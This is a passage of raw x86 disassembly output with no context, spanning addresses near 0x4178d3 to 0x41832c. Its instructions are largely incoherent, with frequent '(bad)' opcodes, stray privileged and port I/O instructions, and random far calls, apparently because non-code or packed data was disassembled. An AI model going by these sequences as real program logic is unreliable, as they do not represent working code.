  4178d3:	loop   0x417896
  4178d5:	pop    eax
  4178d6:	pop    ebp
  4178d7:	or     eax,DWORD PTR [ebx]
  4178d9:	inc    esp
  4178da:	inc    eax
  4178db:	and    BYTE PTR [esi+0x723248d3],bl
  4178e1:	xchg   edi,eax
  4178e2:	(bad)  
  4178e3:	dec    esi
  4178e4:	sti    
  4178e5:	sub    al,0x10
  4178e7:	sub    DWORD PTR [esi],ecx
  4178e9:	sbb    BYTE PTR [ebx*8-0x7af4b781],bh
  4178f0:	shr    edi,cl
  4178f2:	push   eax
  4178f3:	ds cmc 
  4178f5:	cdq    
  4178f6:	loop   0x4178cb
  4178f8:	getsec 
  4178fa:	mov    esi,0x3fbb6148
  4178ff:	sahf   
  417900:	(bad)  
  417901:	adc    dl,dl
  417903:	sbb    eax,0x640813ac
  417908:	mov    ebp,0x54aed6a9
  41790d:	in     al,0x2
  41790f:	rcr    BYTE PTR [ecx+0x0],0x0
	...
  417973:	add    BYTE PTR [eax+0x41],bl
  417976:	pop    ds
  417977:	lods   eax,DWORD PTR ds:[esi]
  417978:	pop    ds
  417979:	(bad)  
  41797a:	cli    
  41797b:	cmc    
  41797c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41797d:	retf   0xe5d4
  417980:	add    dl,BYTE PTR [edi-0x6606737]
  417986:	add    BYTE PTR [eax],al
  417988:	add    eax,0x14000001
  41798d:	inc    ebx
  41798e:	cmp    ch,BYTE PTR [esi+ecx*2]
  417991:	cmp    edx,DWORD PTR [ebx]
  417993:	or     ah,BYTE PTR [esi]
  417995:	test   eax,0xd20c5a75
  41799a:	add    eax,0x38b7baa2
  41799f:	add    BYTE PTR [eax],dh
  4179a1:	xor    DWORD PTR ds:[edx],edx
  4179a4:	dec    ebp
  4179a5:	repnz cdq 
  4179a7:	and    DWORD PTR [ecx+ecx*2+0x188cf632],edi
  4179ae:	ror    DWORD PTR [ecx+esi*1-0x4a],0xc
  4179b3:	xor    DWORD PTR [ebx+ebp*1-0x3682d57f],edx
  4179ba:	fcmovbe st,st(6)
  4179bc:	add    al,al
  4179be:	aam    0x2c
  4179c0:	lods   eax,DWORD PTR ds:[esi]
  4179c1:	jne    0x4179e9
  4179c3:	push   ecx
  4179c4:	cdq    
  4179c5:	leave  
  4179c6:	pop    edi
  4179c7:	cli    
  4179c8:	outs   dx,BYTE PTR ds:[esi]
  4179c9:	push   edx
  4179ca:	cmp    BYTE PTR [ecx-0x3d],al
  4179cd:	in     eax,dx
  4179ce:	mov    eax,ds:0x7fc721ce
  4179d3:	jge    0x4179cf
  4179d5:	push   eax
  4179d6:	pop    ebx
  4179d7:	aaa    
  4179d8:	dec    esp
  4179d9:	retf   
  4179da:	hlt    
  4179db:	adc    esi,eax
  4179dd:	or     ah,BYTE PTR [eax+ebx*1]
  4179e0:	mov    ds:0xe74009c2,eax
  4179e5:	cdq    
  4179e6:	js     0x417a27
  4179e8:	dec    edx
  4179e9:	cld    
  4179ea:	ins    DWORD PTR es:[edi],dx
  4179eb:	sub    DWORD PTR [edi*8-0x22f2e1cb],ebp
  4179f2:	dec    edi
  4179f3:	cmp    DWORD PTR [edx],ebx
  4179f5:	or     BYTE PTR [edx],0xd
  4179f8:	xor    BYTE PTR [ebx],ch
  4179fa:	arpl   WORD PTR [ebp-0x53],bx
  4179fd:	add    DWORD PTR [ebp+0x16],eax
  417a00:	ja     0x417a37
  417a02:	push   0x2ba4d2e6
  417a07:	sar    ch,1
  417a09:	push   ebx
  417a0a:	xchg   ebx,eax
  417a0b:	mov    dl,0x9d
  417a0d:	adc    BYTE PTR [ebp-0x3de99333],ah
  417a13:	cmp    eax,0x66b8af02
  417a18:	daa    
  417a19:	pushf  
  417a1a:	xor    eax,0x31adaa0a
  417a1f:	(bad)
  417a22:	fiadd  WORD PTR [edi+0x67e95d56]
  417a28:	push   edi
  417a29:	(bad)  [esi+0x16a511a3]
  417a2f:	jns    0x417aac
  417a31:	push   0xffffffd9
  417a33:	and    eax,0x4d03cb40
  417a38:	popf   
  417a39:	rcr    bl,1
  417a3b:	retf   0xb3d0
  417a3e:	outs   dx,DWORD PTR ds:[esi]
  417a3f:	jb     0x417a82
  417a41:	dec    esi
  417a42:	push   ds
  417a43:	shl    DWORD PTR [edi+0x1eadaa4],cl
  417a49:	call   0xd555:0xabce590f
  417a50:	add    DWORD PTR [esi+0x16],ecx
  417a53:	adc    ecx,ebx
  417a55:	retf   
  417a56:	imul   edx,DWORD PTR [esi+0x3eb123e3],0xa
  417a5d:	out    dx,eax
  417a5e:	mov    bh,0x7b
  417a60:	pop    ecx
  417a61:	inc    ecx
  417a62:	mov    ah,0xf3
  417a64:	adc    ah,BYTE PTR [edx-0x3ec5e7b9]
  417a6a:	dec    eax
  417a6b:	push   ss
  417a6c:	ror    BYTE PTR [esi-0x73],1
  417a6f:	push   0xfd1206a9
  417a74:	mov    ebp,0x40cebd4
  417a79:	dec    ecx
  417a7a:	xchg   edi,eax
  417a7b:	push   ebp
  417a7c:	xor    BYTE PTR [eax+edi*4+0x29],0x26
  417a81:	dec    ebp
  417a82:	pop    ss
  417a83:	aaa    
  417a84:	xchg   BYTE PTR [edx],dl
  417a86:	es mov edx,0x19bfaa86
  417a8c:	xor    al,0xbc
  417a8e:	adc    ebp,DWORD PTR [edi+0xff]
	...
  417af4:	das    
  417af5:	stos   DWORD PTR es:[edi],eax
  417af6:	cdq    
  417af7:	inc    ecx
  417af8:	popf   
  417af9:	jae    0x417afa
  417afb:	out    dx,eax
  417afc:	(bad)  [eax]
  417afe:	xor    ebx,DWORD PTR [ecx+0x4430441b]
  417b04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417b05:	cli    
  417b06:	add    BYTE PTR [eax],al
  417b08:	add    eax,0x66000001
  417b0d:	test   BYTE PTR [ecx],dh
  417b0f:	add    al,BYTE PTR [edx-0x5]
  417b12:	loop   0x417aab
  417b14:	xchg   edx,eax
  417b15:	ret    
  417b16:	fwait
  417b17:	pop    ebx
  417b18:	sub    BYTE PTR [edx+edi*8],ah
  417b1b:	mov    bh,0x4b
  417b1d:	inc    ebx
  417b1e:	in     al,dx
  417b1f:	js     0x417b30
  417b21:	out    0xa9,eax
  417b23:	lods   al,BYTE PTR ds:[esi]
  417b24:	jle    0x417ae9
  417b26:	sbb    eax,0xb71b1b37
  417b2b:	repnz xchg ebx,eax
  417b2d:	cdq    
  417b2e:	mov    ds:0x861a39c7,al
  417b33:	adc    BYTE PTR [esi-0x67f0a9fa],0xfe
  417b3a:	sbb    esi,DWORD PTR [edx+0x2e8142a3]
  417b40:	push   fs
  417b42:	add    DWORD PTR [eax+0x102a697e],edx
  417b48:	into   
  417b49:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417b4a:	add    ebp,ecx
  417b4c:	arpl   WORD PTR [edx+0x9],ax
  417b4f:	xchg   ebx,eax
  417b50:	int    0xb4
  417b52:	je     0x417b10
  417b54:	aaa    
  417b55:	jo     0x417ae8
  417b57:	paddq  mm5,mm4
  417b5a:	fsubrp st(3),st
  417b5c:	pop    ebp
  417b5d:	data16 fdivr st,st(3)
  417b60:	js     0x417b00
  417b62:	nop
  417b63:	gs ins BYTE PTR es:[edi],dx
  417b65:	mov    esp,0xa4cb8dc2
  417b6a:	inc    ebp
  417b6b:	pusha  
  417b6c:	mov    esi,0x350180d
  417b71:	mov    eax,0xabbcc53b
  417b76:	xor    BYTE PTR [edi+0x1d],0xd4
  417b7a:	sahf   
  417b7b:	call   0x9b2541cd
  417b80:	daa    
  417b81:	pop    edx
  417b82:	pop    esp
  417b83:	outs   dx,DWORD PTR ds:[esi]
  417b84:	js     0x417bd7
  417b86:	push   0xdea760d9
  417b8b:	call   0x51f0:0x783593d1
  417b92:	xor    DWORD PTR [eax],0x62
  417b95:	jne    0x417bf3
  417b97:	adc    eax,DWORD PTR [ebp-0x5d]
  417b9a:	mov    ds:0xa5f413be,al
  417b9f:	mov    ah,0xa2
  417ba1:	sub    dh,al
  417ba3:	mov    ah,0xcc
  417ba5:	imul   ebx,esi,0x1c
  417ba8:	mov    ah,0xc2
  417baa:	(bad)  
  417bab:	ret    0xbccf
  417bae:	ins    DWORD PTR es:[edi],dx
  417baf:	cmp    BYTE PTR [edi-0x47],cl
  417bb2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417bb3:	or     eax,0xc46cbe2b
  417bb8:	popf   
  417bb9:	in     al,0xa1
  417bbb:	xchg   BYTE PTR [edi-0x22a6096b],dl
  417bc1:	adc    edi,DWORD PTR [edi-0x5a]
  417bc4:	ss ret 
  417bc6:	(bad)  
  417bc7:	fst    st(6)
  417bc9:	mov    cl,BYTE PTR [eax+0x285cc7b6]
  417bcf:	add    edi,DWORD PTR [ebx]
  417bd1:	ja     0x417b63
  417bd3:	out    dx,al
  417bd4:	cs ins DWORD PTR es:[edi],dx
  417bd6:	(bad)  
  417bd7:	sbb    al,0x47
  417bd9:	sbb    ah,BYTE PTR [ebx-0x695fa177]
  417bdf:	dec    ebx
  417be0:	push   ds
  417be1:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  417be3:	icebp  
  417be4:	das    
  417be5:	lea    eax,[esp+ecx*2-0x34]
  417be9:	aad    0xb
  417beb:	sbb    eax,0xcc919e99
  417bf0:	arpl   WORD PTR [ebp+0x7b6e336c],di
  417bf6:	mov    bl,dl
  417bf8:	imul   edx,DWORD PTR [ebp-0xd],0x4cf956ea
  417bff:	mov    edx,0x5c37b925
  417c04:	gs sub edi,edx
  417c07:	mov    ?,ebx
  417c09:	repnz push sp
  417c0c:	mov    esi,0xfc6c55ba
	...
  417c71:	add    BYTE PTR [eax],al
  417c73:	add    BYTE PTR [ecx-0x267b6f40],cl
  417c79:	aam    0x9d
  417c7b:	int    0x75
  417c7d:	aaa    
  417c7e:	das    
  417c7f:	aam    0xcd
  417c81:	ja     0x417c13
  417c83:	aaa    
  417c84:	test   eax,0x50000fb
  417c89:	add    DWORD PTR [eax],eax
  417c8b:	add    BYTE PTR [ebx-0x5fabd6cf],cl
  417c91:	jne    0x417d00
  417c93:	dec    BYTE PTR [ebp+0x71990bd8]
  417c99:	add    eax,eax
  417c9b:	clc    
  417c9c:	rcl    BYTE PTR [eax-0x46321f19],cl
  417ca2:	mov    ch,0x56
  417ca4:	pop    es
  417ca5:	mov    ecx,0xa9dce36
  417caa:	sub    al,0xf5
  417cac:	(bad)  
  417cae:	es retf 0x8c45
  417cb2:	out    0x53,al
  417cb4:	inc    esi
  417cb5:	ins    DWORD PTR es:[edi],dx
  417cb6:	les    eax,FWORD PTR [ebp+0x432579e3]
  417cbc:	pop    edi
  417cbd:	mov    bh,0xad
  417cbf:	dec    esp
  417cc0:	inc    ebx
  417cc1:	sub    ah,BYTE PTR [esi+0x9]
  417cc4:	xor    eax,0x6520478e
  417cc9:	sbb    DWORD PTR [ebx+0x26],ecx
  417ccc:	jno    0x417c6b
  417cce:	cwde   
  417ccf:	jmp    0xcef3a53d
  417cd4:	fisttp DWORD PTR [edi+ebx*2+0x3d]
  417cd8:	lahf   
  417cd9:	xchg   edx,eax
  417cda:	popa   
  417cdb:	mov    WORD PTR [eax+0x7f4922e0],ds
  417ce1:	and    ebp,edi
  417ce3:	cmp    BYTE PTR [edx],ch
  417ce5:	cli    
  417ce6:	fcmove st,st(5)
  417ce8:	xchg   DWORD PTR [esi+0x4e4a47c8],ecx
  417cee:	std    
  417cef:	add    dl,BYTE PTR [ebx]
  417cf1:	xor    dh,BYTE PTR [ecx]
  417cf3:	(bad)  
  417cf4:	dec    eax
  417cf5:	or     eax,0xac2cd776
  417cfa:	xor    ah,al
  417cfc:	cmp    eax,0x6ffa19b7
  417d01:	cwde   
  417d02:	inc    eax
  417d03:	repz adc eax,0xf4943f87
  417d09:	xchg   edi,eax
  417d0a:	xchg   esi,eax
  417d0b:	fnsave [edi]
  417d0d:	add    eax,0x1f081656
  417d12:	cmp    al,0xba
  417d14:	mov    ecx,0xd0fac8cb
  417d19:	imul   esi,esi,0x65
  417d1c:	aaa    
  417d1d:	icebp  
  417d1e:	out    0x47,eax
  417d20:	cld    
  417d21:	push   DWORD PTR [edx-0x1d]
  417d24:	clc    
  417d25:	mov    cl,bl
  417d27:	sbb    eax,0x740f2df
  417d2c:	inc    esi
  417d2d:	daa    
  417d2e:	add    BYTE PTR [eax+0x116ae70d],cl
  417d34:	mov    ebx,0xb392968a
  417d39:	mov    eax,ds:0x1e42e55b
  417d3e:	push   edi
  417d3f:	dec    edi
  417d40:	add    al,0x39
  417d42:	cmp    ebx,DWORD PTR [edi+0x1da11934]
  417d48:	ins    BYTE PTR es:[edi],dx
  417d49:	mov    bl,0x52
  417d4b:	xchg   ecx,eax
  417d4c:	ss pop es
  417d4e:	repz pop esi
  417d50:	cmp    BYTE PTR [ebp+0x4f],ch
  417d53:	test   eax,0xfccd45b7
  417d58:	popf   
  417d59:	lock es and bl,bh
  417d5d:	leave  
  417d5e:	ins    DWORD PTR es:[edi],dx
  417d5f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417d60:	push   es
  417d61:	loopne 0x417dd1
  417d63:	cli    
  417d64:	push   edx
  417d65:	hlt    
  417d66:	dec    eax
  417d67:	neg    DWORD PTR [ebx-0x63]
  417d6a:	mov    ch,0x86
  417d6c:	cld    
  417d6d:	mov    eax,ds:0x7cbc01ef
  417d72:	and    bh,ch
  417d74:	int    0x47
  417d76:	dec    ebp
  417d77:	sub    al,0x3f
  417d79:	cmp    esi,DWORD PTR [esi+0x56f6636d]
  417d7f:	push   esi
  417d80:	(bad)  
  417d81:	adc    eax,0x18e7f805
  417d86:	mov    edx,ebx
  417d88:	inc    edi
  417d89:	xlat   BYTE PTR ds:[ebx]
  417d8a:	test   eax,0xee44d66b
  417d8f:	mov    bl,0xc2
	...
  417df1:	add    BYTE PTR [eax],al
  417df3:	add    BYTE PTR [edi],dl
  417df5:	arpl   WORD PTR ds:0x5f7f7d53,bx
  417dfb:	addr16 dec esi
  417dfd:	sub    BYTE PTR [ecx+0x46],ch
  417e00:	pusha  
  417e01:	nop
  417e02:	xor    eax,0xfcae53
  417e07:	add    BYTE PTR ds:0x44000001,al
  417e0d:	or     edi,DWORD PTR [ebp+0x2d]
  417e10:	and    ebx,ecx
  417e12:	fcmovnbe st,st(5)
  417e14:	mov    edx,0x26f0b015
  417e19:	inc    esi
  417e1a:	call   0xe346:0x15b11a05
  417e21:	and    DWORD PTR [edx],eax
  417e23:	stos   BYTE PTR es:[edi],al
  417e24:	push   edx
  417e25:	xor    eax,0x6fec4e3d
  417e2a:	push   ss
  417e2b:	sar    edx,cl
  417e2d:	add    ch,dl
  417e2f:	into   
  417e30:	jae    0x417de4
  417e32:	fwait
  417e33:	mov    cs,WORD PTR [eax]
  417e35:	pop    edx
  417e36:	pop    eax
  417e37:	or     DWORD PTR ds:0x2efdeeaf,0xffffffd5
  417e3e:	and    ebx,DWORD PTR [edi]
  417e40:	outs   dx,DWORD PTR ds:[esi]
  417e41:	and    eax,0x91eb9804
  417e46:	inc    ebx
  417e47:	outs   dx,DWORD PTR ds:[esi]
  417e48:	push   ebp
  417e49:	xchg   DWORD PTR [edx+0x7407b285],edi
  417e4f:	mov    ds:0x26bce42e,al
  417e54:	fimul  WORD PTR [esi+0x63]
  417e57:	pop    ss
  417e58:	cmp    al,0xa6
  417e5a:	sbb    BYTE PTR ds:0x2cab5762,bl
  417e60:	pop    esp
  417e61:	sub    eax,0xc93dfdf8
  417e66:	sar    BYTE PTR [si],cl
  417e69:	lahf   
  417e6a:	jmp    0x417e56
  417e6c:	ret    
  417e6d:	retf   
  417e6e:	daa    
  417e6f:	add    DWORD PTR [ecx-0x76429e2f],0x52
  417e76:	cmp    esp,edi
  417e78:	dec    ebp
  417e79:	pushf  
  417e7a:	rcr    DWORD PTR [edi],1
  417e7c:	dec    ebx
  417e7d:	adc    bh,ch
  417e7f:	test   BYTE PTR [ebx-0x12db6137],0x82
  417e86:	ds cdq 
  417e88:	mov    al,ds:0xe5484785
  417e8d:	jne    0x417e5b
  417e8f:	je     0x417e62
  417e91:	mov    ch,0x49
  417e93:	or     DWORD PTR ds:0x8077473d,edi
  417e99:	lea    esp,[esi]
  417e9b:	and    ah,BYTE PTR [ebp+ebx*4-0x13]
  417e9f:	push   esi
  417ea0:	ins    DWORD PTR es:[edi],dx
  417ea1:	jae    0x417e7b
  417ea3:	push   0x5b
  417ea5:	pop    ebx
  417ea6:	loope  0x417ed0
  417ea8:	int    0xf9
  417eaa:	int3   
  417eab:	dec    ebx
  417eac:	ret    0xcfc
  417eaf:	imul   BYTE PTR [esi+0x155ac00b]
  417eb5:	add    bh,cl
  417eb7:	(bad)  
  417eb8:	cmp    bl,BYTE PTR [ebx-0x20]
  417ebb:	sbb    DWORD PTR [ecx-0x80],ebx
  417ebe:	cmp    BYTE PTR [eax-0x5c],bh
  417ec1:	adc    DWORD PTR [edi-0x460dfeab],ecx
  417ec7:	and    bh,BYTE PTR [esp+ebx*2]
  417eca:	outs   dx,WORD PTR ds:[esi]
  417ecc:	paddd  mm1,QWORD PTR ds:0x4d8a2b10
  417ed3:	(bad)  
  417ed4:	cli    
  417ed5:	pop    DWORD PTR [ebx-0x3b32bd8c]
  417edb:	jbe    0x417e7b
  417edd:	mov    ebx,DWORD PTR [ebx-0x3bfdf227]
  417ee3:	inc    esp
  417ee4:	cmp    eax,0x6983f087
  417ee9:	nop
  417eea:	jp     0x417f63
  417eec:	rcr    BYTE PTR [edi],cl
  417eee:	out    0x78,eax
  417ef0:	pop    ebx
  417ef1:	call   0xccb21950
  417ef6:	or     BYTE PTR [edi],0xa1
  417ef9:	mov    dl,0xbb
  417efb:	cmp    BYTE PTR [ecx],dh
  417efd:	inc    ebx
  417efe:	adc    dh,dh
  417f00:	ds lods eax,DWORD PTR es:[esi]
  417f03:	push   eax
  417f04:	lock adc BYTE PTR [ecx+0xcf0f6ed],0x15
  417f0c:	jne    0x417ea2
  417f0e:	sub    al,0x15
  417f10:	dec    ebp
	...
  417f71:	add    BYTE PTR [eax],al
  417f73:	add    BYTE PTR [edx-0x1a],ah
  417f76:	out    0x3b,al
  417f78:	out    0x3b,al
  417f7a:	(bad)  
  417f7b:	push   DWORD PTR [edx]
  417f7d:	xchg   edx,eax
  417f7e:	xor    al,bh
  417f80:	sub    eax,0xb3035a1d
  417f85:	std    
  417f86:	add    BYTE PTR [eax],al
  417f88:	add    eax,0x89000001
  417f8d:	mov    ebx,0x5fa3bf50
  417f92:	cli    
  417f93:	test   DWORD PTR [ecx],ebx
  417f95:	pop    ebx
  417f96:	lea    esi,ds:0xb4adf9fe
  417f9c:	adc    ebx,DWORD PTR [ebx+eax*2]
  417f9f:	imul   esp,DWORD PTR [edi],0x7ef7dbb3
  417fa5:	rcr    DWORD PTR [edx+0xfa90e26],cl
  417fab:	das    
  417fac:	mov    cl,0xdd
  417fae:	sub    BYTE PTR [eax],bl
  417fb0:	add    eax,0x61fbdce8
  417fb5:	and    al,0xa2
  417fb7:	push   ebp
  417fb8:	scas   eax,DWORD PTR es:[edi]
  417fb9:	jbe    0x41802d
  417fbb:	test   DWORD PTR [ecx+0x57e65400],esp
  417fc1:	xchg   edx,eax
  417fc2:	aad    0xd2
  417fc4:	nop
  417fc5:	stc    
  417fc6:	clc    
  417fc7:	sbb    edx,esp
  417fc9:	inc    ecx
  417fca:	shr    DWORD PTR [edx+0x6c30e701],cl
  417fd0:	or     esi,DWORD PTR [esi]
  417fd2:	mov    ds:0x9352b610,eax
  417fd7:	mov    esp,0x92777d32
  417fdc:	mov    ebx,0x7cf2c4c4
  417fe1:	or     cl,BYTE PTR [ecx]
  417fe3:	mov    bh,0x9e
  417fe5:	push   0xffffffd8
  417fe7:	out    0x3e,eax
  417fe9:	pusha  
  417fea:	inc    esi
  417feb:	idiv   BYTE PTR [esi]
  417fed:	cdq    
  417fee:	iret   
  417fef:	inc    ebx
  417ff0:	mov    ch,0x46
  417ff2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417ff3:	mov    dl,0xe
  417ff5:	or     al,0xa4
  417ff7:	inc    edi
  417ff8:	cmp    BYTE PTR [eax-0x56],cl
  417ffb:	arpl   WORD PTR [edx+0x488bc3ec],sp
  418001:	fmul   QWORD PTR [edx]
  418003:	ror    BYTE PTR [edx],cl
  418005:	cli    
  418006:	inc    edi
  418007:	pop    ss
  418008:	pop    esi
  418009:	pop    es
  41800a:	aas    
  41800b:	cmp    DWORD PTR ds:0xeb34c670,edi
  418011:	cwde   
  418012:	xlat   BYTE PTR ds:[ebx]
  418013:	leave  
  418014:	or     eax,0x67fbaf91
  418019:	mov    ds,WORD PTR [esi]
  41801b:	inc    esp
  41801c:	repnz cmp DWORD PTR [eax],0x6f
  418020:	pop    eax
  418021:	(bad)  
  418023:	ficom  WORD PTR [eax]
  418025:	push   ss
  418026:	jmp    0xd11db900
  41802b:	popf   
  41802c:	and    DWORD PTR [ebp+0x11d8a34],esi
  418032:	mov    al,ds:0xa3fc285a
  418037:	fucomi st,st(7)
  418039:	ins    DWORD PTR es:[edi],dx
  41803a:	dec    esi
  41803b:	test   al,0xd
  41803d:	xlat   BYTE PTR ds:[ebx]
  41803e:	add    al,BYTE PTR [esi]
  418040:	iret   
  418041:	push   eax
  418042:	dec    esp
  418043:	fst    QWORD PTR [edx+0x33f79687]
  418049:	push   eax
  41804a:	ins    DWORD PTR es:[edi],dx
  41804b:	sbb    eax,0xb8fb1576
  418050:	xchg   DWORD PTR [eax-0x1bff5d25],eax
  418056:	dec    ecx
  418057:	mov    al,ds:0xa4fb5985
  41805c:	mov    bl,0xcd
  41805e:	out    0x68,al
  418060:	mov    bl,0xe
  418062:	int3   
  418063:	sub    bh,BYTE PTR [eax+0x1e]
  418066:	cld    
  418067:	inc    edi
  418068:	bound  edi,QWORD PTR [ebx+0x349c5d38]
  41806e:	or     eax,0x617961dd
  418073:	dec    esi
  418074:	xlat   BYTE PTR ds:[ebx]
  418075:	mov    dl,BYTE PTR [ebx-0x34]
  418078:	cmp    al,dl
  41807a:	dec    ecx
  41807b:	jne    0x41803e
  41807d:	push   0xab92206a
  418082:	lods   eax,DWORD PTR ds:[esi]
  418083:	fmul   QWORD PTR [edi]
  418085:	cmp    edi,DWORD PTR [ebp+ebx*1-0x30890b50]
  41808c:	pop    eax
  41808d:	les    ebp,FWORD PTR [edx]
  41808f:	cmc    
  418090:	pusha  
	...
  4180f1:	add    BYTE PTR [eax],al
  4180f3:	add    BYTE PTR [ecx-0xba9482],ch
  4180f9:	push   ebp
  4180fa:	scas   eax,DWORD PTR es:[edi]
  4180fb:	(bad)  
  4180fc:	mov    ds:0xe72fdebc,eax
  418101:	fbld   TBYTE PTR [ecx]
  418103:	outs   dx,BYTE PTR ds:[esi]
  418104:	mov    eax,0x50000fe
  418109:	add    DWORD PTR [eax],eax
  41810b:	add    bl,cl
  41810d:	cmp    edi,edx
  41810f:	scas   al,BYTE PTR es:[edi]
  418110:	aad    0xef
  418112:	lds    edi,FWORD PTR [edi]
  418114:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418115:	out    0xff,al
  418117:	adc    BYTE PTR [ecx+0x45b49221],cl
  41811d:	pop    ds
  41811e:	cwde   
  41811f:	out    0x72,eax
  418121:	in     eax,dx
  418122:	or     DWORD PTR [ecx+0x3d],0x81628742
  418129:	jne    0x418105
  41812b:	cmp    eax,0x56b98494
  418130:	sbb    al,0xd
  418132:	inc    edi
  418133:	in     eax,0x6d
  418135:	mov    cl,0x1f
  418137:	stos   BYTE PTR es:[edi],al
  418138:	sti    
  418139:	jg     0x41815f
  41813b:	cld    
  41813c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41813d:	cmp    BYTE PTR [ebp-0x3ad8b8c4],cl
  418143:	ins    DWORD PTR es:[edi],dx
  418144:	mov    bl,0x4d
  418146:	mov    ah,0x5
  418148:	clc    
  418149:	adc    al,0x43
  41814b:	mov    eax,ds:0xb0aae91b
  418150:	adc    WORD PTR [eax],0x56cd
  418155:	jecxz  0x418150
  418157:	push   edi
  418158:	jl     0x4180e7
  41815a:	les    ebp,FWORD PTR [ecx]
  41815c:	(bad)  
  41815d:	sub    al,0x43
  41815f:	fistp  DWORD PTR [ebx-0x1ad2cbdd]
  418165:	push   ecx
  418166:	adc    eax,0x1a5131d9
  41816b:	rcr    dh,1
  41816d:	ss and esp,edi
  418170:	fmul   DWORD PTR [edi]
  418172:	mov    cl,0x81
  418174:	mov    ds:0x29cdb30d,al
  418179:	mov    edi,0xe957d5b5
  41817e:	imul   edx,edi,0xffffff80
  418181:	cld    
  418182:	(bad)  
  418183:	data16 jl 0x4181bc
  418186:	(bad)  
  418187:	(bad)  
  418188:	or     eax,0xfa1c259c
  41818d:	scas   al,BYTE PTR es:[edi]
  41818e:	fs add eax,0x5539df2c
  418194:	mov    edi,0x2b8458bb
  418199:	mov    edx,0x55760bed
  41819e:	mov    dl,0xa2
  4181a0:	mov    ch,0xb9
  4181a2:	idiv   BYTE PTR [edi-0x34]
  4181a5:	sti    
  4181a6:	sbb    BYTE PTR [ecx+0x318fa171],dl
  4181ac:	xchg   ebx,eax
  4181ad:	push   ds
  4181ae:	jb     0x418170
  4181b0:	sub    BYTE PTR [ebx+edx*1],cl
  4181b3:	cmp    al,BYTE PTR [esi]
  4181b5:	sbb    al,0xf2
  4181b7:	hlt    
  4181b8:	mov    esi,DWORD PTR [ecx+0x20bc79dc]
  4181be:	push   edi
  4181bf:	rcl    DWORD PTR [esi+0x8],cl
  4181c2:	js     0x4181e1
  4181c4:	pop    esi
  4181c5:	test   al,0xe3
  4181c7:	ret    
  4181c8:	js     0x418181
  4181ca:	loope  0x4181be
  4181cc:	jg     0x41815d
  4181ce:	sar    cl,1
  4181d0:	jmp    0xd53dda0f
  4181d5:	add    al,0x9
  4181d7:	in     al,dx
  4181d8:	jns    0x418183
  4181da:	in     al,dx
  4181db:	pusha  
  4181dc:	gs adc al,0xe6
  4181df:	dec    edi
  4181e0:	inc    ebx
  4181e1:	inc    ecx
  4181e2:	sbb    ecx,DWORD PTR [ecx-0x52]
  4181e5:	sti    
  4181e6:	xchg   edi,eax
  4181e7:	in     eax,dx
  4181e8:	or     eax,DWORD PTR [esp+edx*4+0x4c]
  4181ec:	inc    edx
  4181ed:	inc    ebx
  4181ee:	cwde   
  4181ef:	xor    al,bh
  4181f1:	call   0x45de8b91
  4181f6:	(bad)  
  4181f7:	daa    
  4181f8:	cmp    esp,ebp
  4181fa:	aam    0x23
  4181fc:	jl     0x4181a3
  4181fe:	mov    cl,0xb
  418200:	fcmovu st,st(6)
  418202:	sub    eax,0xd24c6f75
  418207:	sub    DWORD PTR [esi-0x6],edi
  41820a:	lods   eax,DWORD PTR ds:[esi]
  41820b:	fwait
  41820c:	rcr    BYTE PTR [edi],0x14
  41820f:	inc    ebx
  418210:	jo     0x418212
	...
  418272:	add    BYTE PTR [eax],al
  418274:	aaa    
  418275:	xchg   edx,eax
  418276:	and    al,0x83
  418278:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418279:	mov    bh,0xb7
  41827b:	mov    dh,0x40
  41827d:	mov    ebx,0x55c7b8d6
  418282:	inc    ebp
  418283:	xchg   DWORD PTR [ebp+0x50000ff],edi
  418289:	add    DWORD PTR [eax],eax
  41828b:	add    BYTE PTR [ecx+0x30],bl
  41828e:	jle    0x418275
  418290:	imul   esp,ebp,0x52
  418293:	mov    esi,eax
  418295:	sub    DWORD PTR [edx-0x47],0x5f
  418299:	in     eax,dx
  41829a:	stos   DWORD PTR es:[edi],eax
  41829b:	mov    dl,0xca
  41829d:	dec    esp
  41829e:	adc    BYTE PTR [ecx+0x5e1de1e3],ah
  4182a4:	mov    edi,0x722ca257
  4182a9:	sub    eax,0x2301a2e0
  4182ae:	mov    ds:0x72eadedb,al
  4182b3:	and    BYTE PTR [ebp+eax*4+0x17657b53],al
  4182ba:	inc    esp
  4182bb:	dec    ecx
  4182bc:	test   BYTE PTR [edx],dl
  4182be:	pop    es
  4182bf:	mov    ds:0xd8d832a1,al
  4182c4:	xor    al,0x2e
  4182c6:	les    ebp,FWORD PTR [ebx-0xcf1cb18]
  4182cc:	or     BYTE PTR [esp+ebx*8-0xcd6bd5],dh
  4182d3:	mov    DWORD PTR [edi],ebx
  4182d5:	push   ecx
  4182d6:	enter  0xb7e6,0x89
  4182da:	dec    edi
  4182db:	lea    ebp,[edx]
  4182dd:	cmp    eax,0x97c991f6
  4182e2:	adc    al,0xc5
  4182e4:	sub    ebp,DWORD PTR [eax-0x6d1b015d]
  4182ea:	xchg   esp,eax
  4182eb:	rol    DWORD PTR [edx-0x48],1
  4182ee:	and    DWORD PTR [edx-0x2c],ecx
  4182f1:	mov    al,0x7
  4182f3:	push   edi
  4182f4:	inc    eax
  4182f5:	rcr    BYTE PTR [eax],0x16
  4182f8:	sub    bl,BYTE PTR [edi]
  4182fa:	stos   BYTE PTR es:[edi],al
  4182fb:	cmp    BYTE PTR [ebx+edx*2],ah
  4182fe:	inc    ecx
  4182ff:	mov    eax,esp
  418301:	xchg   BYTE PTR [ebp+0x34],ch
  418304:	jecxz  0x418317
  418306:	inc    edx
  418307:	and    esp,0x579c7809
  41830d:	add    BYTE PTR ds:0x626712e,cl
  418313:	cs jg  0x418330
  418316:	jbe    0x4182d3
  418318:	gs iret 
  41831a:	push   ebp
  41831b:	xor    ah,dl
  41831d:	xchg   edx,eax
  41831e:	pop    edx
  41831f:	fnstcw WORD PTR [edx-0x2c6391e]
  418325:	inc    esi
  418326:	xchg   DWORD PTR [edi-0x21f91db0],eax
  41832c:	mov    ch,0xa
